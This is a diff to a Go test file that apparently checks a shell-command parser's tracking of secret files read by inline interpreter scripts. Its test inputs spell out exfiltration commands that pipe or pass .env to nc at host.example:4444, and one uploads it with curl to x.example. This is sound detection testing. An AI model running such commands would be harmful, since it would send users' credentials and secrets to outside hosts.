@@ -104,6 +104,14 @@ func TestFileReadsFollowInlineScriptCommands(t *testing.T) {
 			[]string{"python3 direct .env", "cat direct .netrc", "nc stdin .env", "nc stdin .netrc"}},
 		{`python3 -c "import subprocess; subprocess.run(['curl', '-T', '.env', 'https://x.example/u'])"`,
 			[]string{"curl direct .env"}},
+		// An interpreter is given its standard input as a shell is: a script given with -c
+		// leaves it to the commands the script runs, one read from it leaves them none.
+		{`python3 -c "import os; os.system('nc host.example 4444')" <<< "$(cat .env)"`,
+			[]string{"python3 stdin .env", "nc stdin .env", "cat direct .env"}},
+		{"cat .env | python3 -c \"import os; os.system('nc host.example 4444')\"",
+			[]string{"cat direct .env", "python3 stdin .env", "nc stdin .env"}},
+		{"python3 - <<EOF\nimport os\nos.system('nc host.example 4444 $(cat .env)')\nEOF",
+			[]string{"python3 stdin .env", "nc argument .env", "cat direct .env", "cat direct .env"}},
 	} {
 		commands, err := Parse(tc.command)
 		if err != nil {
